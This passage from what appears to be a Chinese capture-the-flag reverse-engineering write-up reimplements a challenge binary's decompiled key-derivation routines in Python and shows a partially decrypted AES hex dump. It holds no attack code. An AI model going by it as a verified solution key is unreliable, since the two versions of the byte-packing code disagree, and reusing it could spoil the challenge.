</span></span><span class="line"><span class="cl">    <span class="n">b4</span> <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">((((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b5</span> <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">(((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">10</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">10</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b6</span> <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">(((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># b7 is the same slot where the code reused v9.m128i_u8[0] as shifting chain,</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># but the construction in the C decomp packs the previous bytes; here we</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># explicitly place b0..b7 as the first 8 bytes.</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># (The original assembly composes them by nested ORs; this yields identical result.)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b7</span> <span class="o">=</span> <span class="n">b0</span>  <span class="c1"># in assembly b0 is re-used in shifts; but final byte ordering below matches assembly packing.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># bytes b8..b15 (upper qword)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b8</span> <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">((((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span>   <span class="c1"># BYTE2 ^ BYTE2</span>
</span></span><span class="line"><span class="cl">    <span class="n">b9</span> <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">(((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">18</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">18</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">9</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b10</span> <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">(((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">20</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">20</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b11</span> <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">(((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">22</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">22</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">11</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># HIBYTE is (v &gt;&gt; 24) &amp; 0xFF</span>
</span></span><span class="line"><span class="cl">    <span class="n">b12</span> <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">((((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b13</span> <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">(((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">26</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">26</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">13</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b14</span> <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">(((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">28</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">28</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">14</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b15</span> <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">(((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">30</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">30</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Pack into bytes little-endian order for the 16-byte xmm (assembly used _mm_load_si128(&amp;v9) where v9</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># was constructed as m128i_i64[0] and m128i_i64[1] with bytes 0..7 then 8..15).</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">b0</span><span class="p">,</span> <span class="n">b1</span><span class="p">,</span> <span class="n">b2</span><span class="p">,</span> <span class="n">b3</span><span class="p">,</span> <span class="n">b4</span><span class="p">,</span> <span class="n">b5</span><span class="p">,</span> <span class="n">b6</span><span class="p">,</span> <span class="n">b7</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                 <span class="n">b8</span><span class="p">,</span> <span class="n">b9</span><span class="p">,</span> <span class="n">b10</span><span class="p">,</span> <span class="n">b11</span><span class="p">,</span> <span class="n">b12</span><span class="p">,</span> <span class="n">b13</span><span class="p">,</span> <span class="n">b14</span><span class="p">,</span> <span class="n">b15</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">out</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">a0</span> <span class="o">=</span> <span class="mh">0xDEADBEEF</span>
</span></span><span class="line"><span class="cl"><span class="n">a1</span> <span class="o">=</span> <span class="mh">0xCAFEBABE</span>
</span></span><span class="line"><span class="cl"><span class="n">val</span> <span class="o">=</span> <span class="n">compute_xmmword_849860</span><span class="p">(</span><span class="n">a0</span><span class="p">,</span> <span class="n">a1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;xmmword_849860 (hex):&#34;</span><span class="p">,</span> <span class="n">val</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>分析感觉是cbc模式，但解密没法正常padding，只好no padding得到第一层解密后的数据</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Plain" data-lang="Plain"><span class="line"><span class="cl">54f6c590f050170247551cacc8be0265522a7853fe790fdd58f8556ad6cf0dda9f534c0db07b8e1d3f065f4e7f59e7db666d6629025a81faab149f70bccb6b67b7ea6b56ea3be73a04cf5c8b835e0391b6c0e22ef1e2269be74979010203040500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005d72b88b6a41daad8d691e1d09253dd3c
</span></span></code></pre></td></tr></table>
</div>
</div><p>接着aes出来后，看到下方多处运算，分析可知用0xCAFEBABEDEADBEEFLL初始化了密钥，同样同构下拿到96字节密钥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rol8</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">x</span> <span class="o">&amp;=</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">    <span class="n">n</span> <span class="o">%=</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">((</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="n">n</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">n</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">compute_a2_from_a1</span><span class="p">(</span><span class="n">a1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    a1: iterable with at least two 32-bit unsigned ints [a1[0], a1[1], ...]
</span></span></span><span class="line"><span class="cl"><span class="s2">    returns: bytearray of length 128 representing the memory region written by sub_404B70
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;a1 must have at least two elements&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">a1_0</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">a1</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">    <span class="n">a1_1</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">a1</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">a2</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>  <span class="c1"># allocate enough space</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># write a2[5].m128i_i64[0] = *(_QWORD *)a1  -&gt; offset 5*16 = 80, write 8 bytes little-endian (a1[0], a1[1])</span>
</span></span><span class="line"><span class="cl">    <span class="n">struct</span><span class="o">.</span><span class="n">pack_into</span><span class="p">(</span><span class="s2">&#34;&lt;II&#34;</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="mi">5</span> <span class="o">*</span> <span class="mi">16</span><span class="p">,</span> <span class="n">a1_0</span><span class="p">,</span> <span class="n">a1_1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># --- first loop: fill bytes 0..31 ---</span>
</span></span><span class="line"><span class="cl">    <span class="n">v3</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">key_val</span> <span class="o">=</span> <span class="p">(</span><span class="n">a1</span><span class="p">[</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">shift</span> <span class="o">=</span> <span class="p">(</span><span class="mi">3</span> <span class="o">*</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x1F</span>    <span class="c1"># x86 shifts mask to 5 bits</span>
</span></span><span class="line"><span class="cl">        <span class="n">shifted</span> <span class="o">=</span> <span class="p">(</span><span class="n">key_val</span> <span class="o">&gt;&gt;</span> <span class="n">shift</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span> <span class="k">if</span> <span class="n">shift</span> <span class="o">&lt;</span> <span class="mi">32</span> <span class="k">else</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="n">v5</span> <span class="o">=</span> <span class="p">(</span><span class="n">v3</span> <span class="o">+</span> <span class="n">shifted</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">        <span class="n">v3</span> <span class="o">=</span> <span class="p">(</span><span class="n">v3</span> <span class="o">+</span> <span class="mi">17</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">        <span class="n">val</span> <span class="o">=</span> <span class="p">(</span><span class="n">v5</span> <span class="o">^</span> <span class="mh">0x37</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">        <span class="n">a2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">rol8</span><span class="p">(</span><span class="n">val</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># --- second loop: fill bytes 32..63 ---</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">key_val</span> <span class="o">=</span> <span class="p">(</span><span class="n">a1</span><span class="p">[((</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">shift</span> <span class="o">=</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">j</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x1F</span>
</span></span><span class="line"><span class="cl">        <span class="n">shifted</span> <span class="o">=</span> <span class="p">(</span><span class="n">key_val</span> <span class="o">&gt;&gt;</span> <span class="n">shift</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span> <span class="k">if</span> <span class="n">shift</span> <span class="o">&lt;</span> <span class="mi">32</span> <span class="k">else</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="n">val32</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">^</span> <span class="n">shifted</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">        <span class="n">val_sub</span> <span class="o">=</span> <span class="p">(</span><span class="n">val32</span> <span class="o">-</span> <span class="mi">85</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">        <span class="n">val_byte</span> <span class="o">=</span> <span class="n">val_sub</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">        <span class="n">a2</span><span class="p">[</span><span class="mi">32</span> <span class="o">+</span> <span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">rol8</span><span class="p">(</span><span class="n">val_byte</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># --- result[5].m128i_i32[2] = 1  -&gt; offset 5*16 + 8 = 88, write 4-byte little-endian 1 ---</span>
</span></span><span class="line"><span class="cl">    <span class="n">struct</span><span class="o">.</span><span class="n">pack_into</span><span class="p">(</span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="mi">5</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># --- construct v9 (16 bytes) and store into a2[4] (offset 64..79) ---</span>
</span></span><span class="line"><span class="cl">    <span class="n">v7</span> <span class="o">=</span> <span class="n">a1_0</span>
</span></span><span class="line"><span class="cl">    <span class="n">v8</span> <span class="o">=</span> <span class="n">a1_1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">byte_of</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># We&#39;ll compute bytes b0..b15 according to the decompiled expressions.</span>
</span></span><span class="line"><span class="cl">    <span class="n">b0</span>  <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">((</span><span class="n">v7</span> <span class="o">^</span> <span class="n">v8</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">    <span class="n">b1</span>  <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">(((</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b2</span>  <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">(((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b3</span>  <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">(((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b4</span>  <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">((((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b5</span>  <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">(((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">10</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">10</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b6</span>  <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">(((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b7</span>  <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">(((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">14</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">14</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">b8</span>  <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">((((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b9</span>  <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">(((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">18</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">18</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">9</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b10</span> <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">(((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">20</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">20</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b11</span> <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">(((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">22</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">22</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">11</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b12</span> <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">((((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b13</span> <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">(((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">26</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">26</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">13</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b14</span> <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">(((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">28</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">28</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">14</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b15</span> <span class="o">=</span> <span class="n">byte_of</span><span class="p">(</span><span class="mi">9</span> <span class="o">*</span> <span class="p">(((</span><span class="n">v8</span> <span class="o">&gt;&gt;</span> <span class="mi">30</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v7</span> <span class="o">&gt;&gt;</span> <span class="mi">30</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">v9_bytes</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">b0</span><span class="p">,</span> <span class="n">b1</span><span class="p">,</span> <span class="n">b2</span><span class="p">,</span> <span class="n">b3</span><span class="p">,</span> <span class="n">b4</span><span class="p">,</span> <span class="n">b5</span><span class="p">,</span> <span class="n">b6</span><span class="p">,</span> <span class="n">b7</span><span class="p">,</span>
